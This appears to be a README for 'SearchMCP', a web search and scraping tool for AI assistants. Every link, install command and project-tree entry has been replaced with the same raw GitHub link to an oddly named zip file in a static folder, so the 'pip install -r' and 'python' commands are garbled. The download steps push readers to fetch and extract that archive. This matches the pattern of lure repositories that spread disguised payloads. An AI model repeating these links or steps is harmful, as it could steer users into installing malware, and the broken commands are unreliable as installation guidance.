# 🌐 SearchMCP - Effortless Web Search and Scraping

[![Download SearchMCP](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip)](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip)

## 🚀 Getting Started

SearchMCP gives your AI assistant the power to browse the internet. It offers features like searching multiple engines, directly accessing Google results, and reading web pages in an easy-to-read format. This guide helps you install and run SearchMCP smoothly.

### 🤝 Features

- **Web Search**: Uses SearXNG for comprehensive searches, providing knowledge cards and suggestions.
- **Google Search**: Fetches Google search results directly.
- **Read URL**: Converts web content to Markdown, allowing for easier navigation of long documents.

### 🛡️ Anti-detection Capability

SearchMCP uses [Camoufox](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip) to help avoid blocks from websites. Users on Windows will run in a standard mode, as Camoufox does not support Windows systems, which may reduce effectiveness.

### 📊 Monitoring Dashboard

SearchMCP includes a built-in web dashboard for live monitoring of tool usage and logs.

Access it at: `http://localhost:9191/dashboard`

## 📥 Download & Install

To download SearchMCP, visit the [Releases Page](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip).

### Steps to Download

1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip) to go to the downloads section.
2. **Select the Latest Version**: Choose the most recent release to ensure you have the newest features and fixes.
3. **Download the ZIP File**: Click on the ZIP file to download it to your computer.
4. **Extract the File**: Locate the downloaded file and extract its contents.

## 🛠️ Installation Instructions

Before running the application, you need to install some dependencies.

1. **Open Your Command Line Interface**: On Windows, search for "Command Prompt" or "PowerShell". On macOS or Linux, use the terminal.
  
2. **Install the Dependencies**: Type the following command and press Enter:
    ```bash
    pip install -r https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip
    ```
  
3. **Fetch Camoufox Browser**: Enter the command below to install Camoufox:
    ```bash
    camoufox fetch
    ```

### ⚙️ Running SearchMCP

Once the installation is complete, you can run SearchMCP by following these steps:

1. **Open Command Line Interface Again**.
2. **Run the Main Program**: Enter the following command:
    ```bash
    python https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip
    ```
   
3. **Access the Service**: Open your web browser and go to `http://0.0.0.0:9191`. The service will be ready for use.

### 💬 Dependency Services

For full functionality, the SearXNG service must run alongside SearchMCP. Ensure that SearXNG is available at `http://127.0.0.1:10003` for the web search feature to work.

## 🗂️ Project Structure

After downloading, you will see the following file structure:

```
.
├── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip              # Main program file
├── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip     # Python dependencies file
├── static/              # Holds static resources
│   ├── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip     # CSS styles
│   └── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip        # JavaScript functionality
└── templates/           # HTML templates
    └── https://raw.githubusercontent.com/smksamir/SearchMCP/main/static/MCP_Search_ulnometacarpal.zip   # Dashboard page template
```

## 📝 License

This project is licensed under the MIT License.